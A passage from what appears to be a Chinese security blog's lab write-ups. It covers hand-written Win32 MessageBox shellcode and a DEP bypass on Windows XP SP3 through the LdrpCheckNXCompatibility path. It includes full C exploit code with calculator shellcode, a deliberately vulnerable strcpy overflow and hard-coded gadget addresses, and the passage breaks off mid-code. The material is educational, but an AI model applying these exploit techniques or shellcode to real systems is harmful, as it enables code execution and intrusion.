class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">char</span> code[] =</div><div class=\"line\"><span class=\"comment\">//first put our strings on the stack</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x20\\x20\\x20\\x00\"</span> <span class=\"comment\">// Push \"star\"</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x73\\x74\\x61\\x72\"</span> <span class=\"comment\">// = star</span></div><div class=\"line\"><span class=\"string\">\"\\x8b\\xdc\"</span> <span class=\"comment\">// mov ebx,esp  字符串\"star\"的地址存入ebx</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x74\\x61\\x72\\x00\"</span> <span class=\"comment\">// Push</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x62\\x79\\x20\\x73\"</span> <span class=\"comment\">// \"You have been pwned by Corelan\"</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x6e\\x65\\x64\\x20\"</span> <span class=\"comment\">// = Text</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x6e\\x20\\x70\\x77\"</span> <span class=\"comment\">//</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x20\\x62\\x65\\x65\"</span> <span class=\"comment\">//</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x68\\x61\\x62\\x61\"</span> <span class=\"comment\">//</span></div><div class=\"line\"><span class=\"string\">\"\\x68\\x59\\x6f\\x75\\x20\"</span> <span class=\"comment\">//</span></div><div class=\"line\"><span class=\"comment\">//\"\\x68\\x59\\x6f\\x75\\x20\" //</span></div><div class=\"line\"><span class=\"string\">\"\\x8b\\xcc\"</span> <span class=\"comment\">// mov ecx,esp  文本 Text的地址存入 ecx</span></div><div class=\"line\"><span class=\"comment\">//现在将 参数、指针压入栈中</span></div><div class=\"line\"><span class=\"comment\">//最后一个参数 hwnd = 0.</span></div><div class=\"line\"><span class=\"comment\">//eax清零，入栈</span></div><div class=\"line\"><span class=\"string\">\"\\x33\\xc0\"</span> <span class=\"comment\">//xor eax,eax =&gt; eax is now 00000000</span></div><div class=\"line\"><span class=\"string\">\"\\x50\"</span> <span class=\"comment\">//push eax</span></div><div class=\"line\"><span class=\"comment\">//第二个参数是 caption. 地址在ebx中, so push ebx</span></div><div class=\"line\"><span class=\"string\">\"\\x53\"</span></div><div class=\"line\"><span class=\"comment\">//下一个参数 text.地址在ecx中, so do push ecx</span></div><div class=\"line\"><span class=\"string\">\"\\x51\"</span></div><div class=\"line\"><span class=\"comment\">//最后一个参数 button (OK=0). eax的值依然为0</span></div><div class=\"line\"><span class=\"comment\">//so push eax</span></div><div class=\"line\"><span class=\"string\">\"\\x50\"</span></div><div class=\"line\"><span class=\"comment\">//四个参数已经依次压入栈中了</span></div><div class=\"line\"><span class=\"comment\">//但是MessageBox是从EBP+8开始读取参数的，需向栈中再次压入8bytes，调整栈针</span></div><div class=\"line\"><span class=\"comment\">//we will just add anoter push eax instructions to align</span></div><div class=\"line\"><span class=\"string\">\"\\x50\"</span></div><div class=\"line\"><span class=\"comment\">// 调用函数</span></div><div class=\"line\"><span class=\"string\">\"\\xc7\\xc6\\xea\\x07\\xd5\\x77\"</span> <span class=\"comment\">// mov esi,0x77d507EA</span></div><div class=\"line\"><span class=\"string\">\"\\xff\\xe6\"</span>; <span class=\"comment\">//jmp esi = launch MessageBox</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span></span>&#123;</div><div class=\"line\">\tLoadLibrary(<span class=\"string\">\"user32.dll\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">int</span> (*func)();</div><div class=\"line\">\tfunc = (<span class=\"keyword\">int</span> (*)()) code;</div><div class=\"line\">\t(<span class=\"keyword\">int</span>)(*func)();</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">Tips：</font>你可以通过简单的指令（Immunity Debugger：mona）来得到机器码</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez45k9ksurj30c303yjrw.jpg\" alt=\"\"></p>\n<p>最终弹出对话框</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ez45n4ake9j305c02wmx6.jpg\" alt=\"\"></p>\n<h1 id=\"Immunity-Debugger分析\"><a href=\"#Immunity-Debugger分析\" class=\"headerlink\" title=\"Immunity Debugger分析\"></a>Immunity Debugger分析</h1><h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/\" target=\"_blank\" rel=\"external\">https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/</a><br><a href=\"http://bbs.pediy.com/showthread.php?t=120649\" target=\"_blank\" rel=\"external\">Exploit 编写系列教程第九篇Win32 Shellcode编写入门</a></p>\n"},{"title":"绕过DEP之利用ZwSetInformationProcess","url":"http://huirong.github.io/2015/12/18/ZeSetInformationProcess-bypass-DEP/","content":"<p>数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。<br>本文讲述直接将进程的DEP 保护关闭，实施攻击。<br><a id=\"more\"></a></p>\n<h1 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h1><ul>\n<li>操作系统：Microsoft Windows XP SP3</li>\n<li>分析工具：OllyDBG</li>\n<li>编译器：VC++ 6.0</li>\n</ul>\n<h1 id=\"ZwSetInformationProcess\"><a href=\"#ZwSetInformationProcess\" class=\"headerlink\" title=\"ZwSetInformationProcess\"></a>ZwSetInformationProcess</h1><p>一个进程的DEP 设置标识保存在KPROCESS 结构中的_KEXECUTE_OPTIONS 上，而这个标识可以通过API 函数ZwQueryInformationProcess 和ZwSetInformationProcess 进行查询和修改。</p>\n<p>首先来看一下_KEXECUTE_OPTIONS 的结构。<br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">_KEXECUTE_OPTIONS</div><div class=\"line\">Pos0ExecuteDisable :<span class=\"number\">1</span><span class=\"built_in\">bit</span></div><div class=\"line\">Pos1ExecuteEnable :<span class=\"number\">1</span><span class=\"built_in\">bit</span></div><div class=\"line\">Pos2DisableThunkEmulation :<span class=\"number\">1</span><span class=\"built_in\">bit</span></div><div class=\"line\">Pos3Permanent :<span class=\"number\">1</span><span class=\"built_in\">bit</span></div><div class=\"line\">Pos4ExecuteDispatchEnable :<span class=\"number\">1</span><span class=\"built_in\">bit</span></div><div class=\"line\">Pos5ImageDispatchEnable :<span class=\"number\">1</span><span class=\"built_in\">bit</span></div><div class=\"line\">Pos6Spare :<span class=\"number\">2</span><span class=\"built_in\">bit</span></div></pre></td></tr></table></figure></p>\n<p>这些标识位中前4 个bit 与DEP 相关</p>\n<ul>\n<li>当前进程DEP 开启时ExecuteDisable 位被置1</li>\n<li>当进程DEP 关闭时ExecuteEnable位被置1</li>\n<li>DisableThunkEmulation 是为了兼容ATL 程序设置的</li>\n<li>Permanent 被置1 表示这些标志都不能再被修改。</li>\n</ul>\n<p>真正影响DEP 状态是前两位，所以我们只要将_KEXECUTE_OPTIONS的值设置为0x02（二进制为00000010）就可以将ExecuteEnable置为1。</p>\n<p>接下来我们来看看关键函数NtSetInformationProcess：<br><figure class=\"highlight lasso\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ZwSetInformationProcess(</div><div class=\"line\"><span class=\"keyword\">IN</span> <span class=\"keyword\">HANDLE</span> ProcessHandle,</div><div class=\"line\"><span class=\"keyword\">IN</span> PROCESS_INFORMATION_CLASS ProcessInformationClass,</div><div class=\"line\"><span class=\"keyword\">IN</span> PVOID ProcessInformation,</div><div class=\"line\"><span class=\"keyword\">IN</span> ULONG ProcessInformationLength );</div></pre></td></tr></table></figure></p>\n<ul>\n<li>第一个参数为进程的句柄，设置为−1 的时候表示为当前进程</li>\n<li>第二个参数为信息类</li>\n<li>第三个参数可以用来设置_KEXECUTE_OPTIONS</li>\n<li>第四个参数为第三个参数的长度</li>\n</ul>\n<p>Skape 和Skywing 在他们的论文Bypassing Windows Hardware-Enforced DEP 中给出了关闭DEP 的参数设置。<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE<span class=\"comment\">;</span></div><div class=\"line\">ZwSetInformationProcess(</div><div class=\"line\"><span class=\"name\">NtCurrentProcess</span>(), // (<span class=\"name\">HANDLE</span>)<span class=\"number\">-1</span></div><div class=\"line\">ProcessExecuteFlags, // <span class=\"number\">0</span>x22</div><div class=\"line\"><span class=\"symbol\">&amp;ExecuteFlags</span>, // ptr to <span class=\"number\">0</span>x2</div><div class=\"line\">sizeof(<span class=\"name\">ExecuteFlags</span>))<span class=\"comment\">; // 0x4</span></div></pre></td></tr></table></figure></p>\n<p>所以我们只要构造一个的合乎要求的栈帧，然后调用这个函数就可以为进程关闭DEP了。</p>\n<p>还有一个小问题，函数的参数中包含着0x00 这样的截断字符，这会造成字符串复制的时候被截断。既然自己构造参数会出现问题，那么我们可不可以在系统中寻找已经构造好的参数呢？如果系统中存在一处关闭进程DEP 的调用，我们就可直接利用它构造参数来关闭进程的DEP 了。</p>\n<h1 id=\"DEP关闭条件\"><a href=\"#DEP关闭条件\" class=\"headerlink\" title=\"DEP关闭条件\"></a>DEP关闭条件</h1><p>在这微软的兼容性考虑又惹祸了，如果一个进程的Permanent 位没有设置，当它加载DLL时，系统就会对这个DLL 进行DEP 兼容性检查，当存在兼容性问题时进程的DEP 就会被关闭。为此微软设立了LdrpCheckNXCompatibility函数，当符合以下条件之一时进程的DEP 会被关闭：</p>\n<ol>\n<li>当DLL 受SafeDisc 版权保护系统保护时；</li>\n<li>当DLL 包含有.aspcak、.pcle、.sforce 等字节时；</li>\n<li>Windows Vista 下面当DLL 包含在注册表“HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptions”键下边标识出不需要启动DEP 的模块时。</li>\n</ol>\n<p>如果我们能够模拟其中一种情况，结果会是怎么样的呢？答案是进程的DEP 被关闭！<br>这里选择第一个条件进行尝试。我们来看一下Windows XP SP3 下LdrpCheckNXCompatibility 关闭DEP 的具体流程，以SafeDisc 为例。如图：</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1ez5zr0kgu0j30s40e2q5p.jpg\" alt=\"\"></p>\n<p>现在我们知道LdrpCheckNXCompatibility 关闭DEP 的流程了，我们开始尝试模拟这个过程，我们将从0x7C93CD24 入手关闭DEP，这个地址可以通过OllyFindAddr 插件中的Disable DEP→Disable DEP &lt;=XP SP3 来搜索，如图12.3.3 所示。</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez61fdorvkj30hk01374u.jpg\" alt=\"\"></p>\n<font color=\"red\">由于只有 CMP AL，1 成立的情况下程序才能继续执行，所以我们需要一个指令将AL 修改为1。</font>\n\n<p>将AL 修改为1 后我们让程序转到0x7C93CD24 执行，在执行0x7C93CD6F 处的RETN4 时DEP 已经关闭，此时如果我们可以在让程序在RETN 到一个我们精心构造的指令地址上，就有可能转入shellcode 中执行了。我们通过以下代码来分析此流程的具体过程。<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">#include&lt;stdlib.h&gt;</div><div class=\"line\">#include&lt;string.h&gt;</div><div class=\"line\">#include&lt;stdio.h&gt;</div><div class=\"line\">#include&lt;windows.h&gt;</div><div class=\"line\"></div><div class=\"line\">char shellcode[]=</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>0A<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>1E<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>63<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>D1<span class=\"symbol\">\\x</span>4F<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>0C\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>F4<span class=\"symbol\">\\x</span>8D<span class=\"symbol\">\\x</span>7E<span class=\"symbol\">\\x</span>F4<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>DB<span class=\"symbol\">\\x</span>B7<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>2B<span class=\"symbol\">\\x</span>E3<span class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>BB<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>53\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>75<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>D2<span class=\"symbol\">\\x</span>64<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>5A<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>4B<span class=\"symbol\">\\x</span>0C<span class=\"symbol\">\\x</span>8B\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>1C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>09<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>AD<span class=\"symbol\">\\x</span>3D<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>0A<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>1E<span class=\"symbol\">\\x</span>75<span class=\"symbol\">\\x</span>05<span class=\"symbol\">\\x</span>95\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>F8<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>60<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>3C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>4C<span class=\"symbol\">\\x</span>05<span class=\"symbol\">\\x</span>78<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>CD<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>59\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>20<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>DD<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>47<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>34<span class=\"symbol\">\\x</span>BB<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>F5<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>0F<span class=\"symbol\">\\x</span>BE<span class=\"symbol\">\\x</span>06<span class=\"symbol\">\\x</span>3A\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>C4<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>C1<span class=\"symbol\">\\x</span>CA<span class=\"symbol\">\\x</span>07<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>D0<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>EB<span class=\"symbol\">\\x</span>F1<span class=\"symbol\">\\x</span>3B<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>1C<span class=\"symbol\">\\x</span>75\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>E4<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>59<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>DD<span class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>3C<span class=\"symbol\">\\x</span>7B<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>59<span class=\"symbol\">\\x</span>1C<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>DD<span class=\"symbol\">\\x</span>03\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>2C<span class=\"symbol\">\\x</span>BB<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>5F<span class=\"symbol\">\\x</span>AB<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>3D<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>0A<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>1E<span class=\"symbol\">\\x</span>75<span class=\"symbol\">\\x</span>A9<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>DB\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>77<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>C4<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>50\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>F8<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>E2<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>7C\"//MOV EAX,1 RETN 地址</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>1D<span class=\"symbol\">\\x</span>5D\"//修正EBP</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>19<span class=\"symbol\">\\x</span>4A<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>7C\"//增大ESP</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>B4<span class=\"symbol\">\\x</span>C1<span class=\"symbol\">\\x</span>C5<span class=\"symbol\">\\x</span>7D\"//jmp esp</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>CD<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>7C\"//关闭DEP 代码的起始位置</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>E9<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>FF\"//回跳指令</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\";</div><div class=\"line\"></div><div class=\"line\">void test()&#123;</div><div class=\"line\">\tchar tt[176];</div><div class=\"line\">\tstrcpy(tt,shellcode);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">int main()&#123;</div><div class=\"line\">\tHINSTANCE hInst = LoadLibrary(\"shell32.dll\");</div><div class=\"line\">\tchar temp[200];</div><div class=\"line\">\ttest();</div><div class=\"line\">\treturn 0;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>对实验思路和代码简要解释如下。 </p>\n<ol>\n<li>为了更直观地反映绕过DEP 的过程，我们在本次实验中不启用GS 和SafeSEH。</li>\n<li>函数test 存在一个典型的溢出，通过向str 复制超长字符串造成str 溢出，进而覆盖函数返回地址。</li>\n<li>将函数的返回地址覆盖为类似MOV AL,1 retn 的指令，在将AL置1 后转入0x7C93CD24关闭DEP。</li>\n<li>DEP 关闭后shellcode 就可以正常执行了。</li>\n</ol>\n<h1 id=\"构造shellcode\"><a href=\"#构造shellcode\" class=\"headerlink\" title=\"构造shellcode\"></a>构造shellcode</h1><p>通过前面的分析，我们需要先找到类似MOV AL,1 RETN 的指令，即可以将AL 置1，又可以通过retn 收回程序控制权。</p>\n<p>OllyFindAddr 插件的Disable DEP→Disable DEP &lt;=XP SP3 搜索结果的Step2 部分就是符合要求的指令。搜索结果如图：</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1ez61j4s6a1j30gd033dhc.jpg\" alt=\"\"></p>\n<p>为了避免执行strcpy 时shellcode 被截断，我们需要选择一个不包含0x00 的地址，本次实验中我们使用0x7C92E252 覆盖函数的返回地址。</p>\n<p>关于覆盖掉函数返回地址所需字符串长度的计算我们不再讨论，在本次实验中我们需要184个字节可以覆盖掉函数返回地址，所以我们在181~184 字节处放上0x7C92E252，shellcode 内容如下所示。<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">charshellcode[]=</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>0A<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>1E<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>63<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>D1<span class=\"symbol\">\\x</span>4F<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>0C\"</div><div class=\"line\">\"……\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>77<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>C4<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>50\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>F8<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>E2<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>7C\"//MOV EAX,1 RETN 地址</div><div class=\"line\">;</div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">Tips:</font> 省略号前后的内容为弹出计算器二进制代码，上面的cpp文件中有写出，后面就不具体写出了</p>\n<p>然后编译程序，用OllyDbg 加载调试程序。在0x7C92E257，即MOV EAX,1 后边的RETN指令处暂停程序。观察堆栈可以看到此时ESP 指向test 函数返回地址的下方，而这个ESP 指向的内存空间存放的值将是RETN 指令要跳到的地址，如图：</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ez620ebxdyj30ho0azdk5.jpg\" alt=\"\"></p>\n<p>所以我们需要在这个位置放上0x7C93CD24 （若此处不理解，可参考第一张图，LdrpCheckNXCompatibility 关闭DEP 的具体流程）以便让程序转入关闭DEP 流程，我们为shellcode 添加4 个字节，并放置0x7C93CD24，如下所示。<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">charshellcode[]=</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>0A<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>1E<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>63<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>D1<span class=\"symbol\">\\x</span>4F<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>0C\"</div><div class=\"line\">\"……\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>77<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>C4<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>50\"</div><div 